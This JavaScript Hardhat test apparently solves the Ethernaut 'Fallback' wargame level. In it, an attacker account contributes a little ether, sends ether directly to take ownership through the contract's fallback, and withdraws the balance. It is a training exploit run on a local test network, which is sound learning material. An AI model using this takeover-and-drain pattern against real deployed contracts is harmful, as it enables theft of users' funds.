const { expect } = require("chai");
const { ethers } = require("hardhat");

const value = ethers.utils.parseEther("0.0009");

/**
 * Contract will give ownership to sender, if it has contributed in the past 
 * and now sends ether to the contract.
 */

describe("Fallback", function () {

    it("takes ownership of contract", async function () {
        [owner, attacker] = await ethers.getSigners();;
        const Fallback = await ethers.getContractFactory("Fallback");
        const fallback = await Fallback.deploy();
        await fallback.deployed();
        expect(await fallback.owner()).to.equal(owner.address);

        await fallback.connect(attacker).contribute({value});
        expect(await fallback.owner()).to.equal(owner.address);
        expect(await fallback.connect(attacker).getContribution()).to.equal(value);

        await attacker.sendTransaction({to: fallback.address, value});
        expect(await fallback.owner()).to.equal(attacker.address);

        const oldBalance = await ethers.provider.getBalance(attacker.address);
        await fallback.connect(attacker).withdraw();
        const newBalance = await ethers.provider.getBalance(attacker.address);
        expect(+newBalance).to.be.greaterThan(+oldBalance);
    });
});
